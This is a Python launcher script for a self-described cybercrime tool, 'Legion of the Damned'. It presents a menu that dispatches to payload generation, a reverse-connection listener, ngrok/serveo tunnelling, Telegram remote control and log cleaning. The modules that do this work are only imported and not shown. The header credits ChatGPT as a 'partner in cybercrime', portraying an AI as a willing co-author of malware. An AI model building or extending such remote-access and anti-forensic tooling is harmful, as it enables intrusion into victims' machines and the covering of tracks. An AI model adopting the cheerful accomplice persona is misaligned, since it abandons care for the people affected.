# Legion of the Damned v1.0 - Base Setup
# Author: Ahad & ChatGPT (Partners in Cybercrime 😎)

import os
import subprocess
import sys
import time
from payload_generator import generate_payload
from listener import listener
from tunnel import tunnel_setup
from telegram_bot import start_bot
from log_cleaner import clean_logs
from auto_dependency_installer import install_dependencies


# Banner
def banner():
    print("""
    ======================================
       LEGION OF THE DAMNED v1.0 ☠️
    ======================================
    Author: Ahad (Pak Coder) & ChatGPT
    Features: Payloads, Listener, Remote Access
              Telegram Control, Automation & More!
    ======================================
    """)

# Main Menu
def main_menu():
    banner()
    print("[1] Generate Payload")
    print("[2] Start Listener")
    print("[3] Setup Tunnel (Ngrok/Serveo)")
    print("[4] Connect Telegram Bot")
    print("[5] Exit")
    print("[6] Clean Logs")

    choice = input("\nChoose an option: ")

    if choice == '1':
        generate_payload()
    elif choice == '2':
        listener()  # Use the correct listener function
    elif choice == '3':
        tunnel_setup()  # Correct function for tunnel setup
    elif choice == '4':
        start_bot()  # Correct function for Telegram bot
    elif choice == '5':
        print("Exiting... Stay dangerous, hacker! ☠️")
        sys.exit()
    elif choice == '6':
        clean_logs()  # Correct function for log cleaning
    else:
        print("Invalid choice. Try again!")
        time.sleep(1)
        main_menu()

# Start the tool
if __name__ == '__main__':
    install_dependencies()  # Automatically installs dependencies
    main_menu()  # Start the main menu
